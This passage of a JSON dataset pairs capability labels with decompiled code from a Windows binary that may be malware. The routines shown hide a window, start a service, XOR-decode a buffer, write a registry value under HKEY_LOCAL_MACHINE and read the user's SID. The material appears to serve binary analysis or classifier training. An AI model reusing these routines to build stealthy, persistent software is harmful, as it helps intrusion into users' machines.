        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e76) overlaps instruction at (ram,0x00402e75)\n// \n// WARNING: Removing unreachable block (ram,0x00402e73)\n\nuint __cdecl fcn.00402e30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x406010, 0x41f9d8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 187
    },
    "00401000": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    // [00] -r-x section size 16384 named .text\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 273
    },
    "00403290": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032de) overlaps instruction at (ram,0x004032dd)\n// \n// WARNING: Removing unreachable block (ram,0x004032e8)\n// WARNING: Removing unreachable block (ram,0x004032db)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403290(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_4) {\n        do {\n            *(iVar1 + param_3) = param_4 ^ *(iVar1 + param_3) ^ *(iVar1 % param_2 + param_1);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < param_4);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00401f40": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401f40(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4106a8, 0x4106ec, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "00402310": {
        "rules": [
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402335) overlaps instruction at (ram,0x00402332)\n// \n\nuint fcn.00402310(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    float10 extraout_ST0;\n    uint var_ch;\n    \n    uVar1 = *(unaff_EDI + 0xe58be73);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        if (iVar2 == 0) {\n            return 0;\n        }\n        if ((-1 < iVar2) && (-1 >= iVar2)) {\n            *((unaff_EDI ^ uVar1) + 0x1c) = extraout_ST0;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 252
    }
}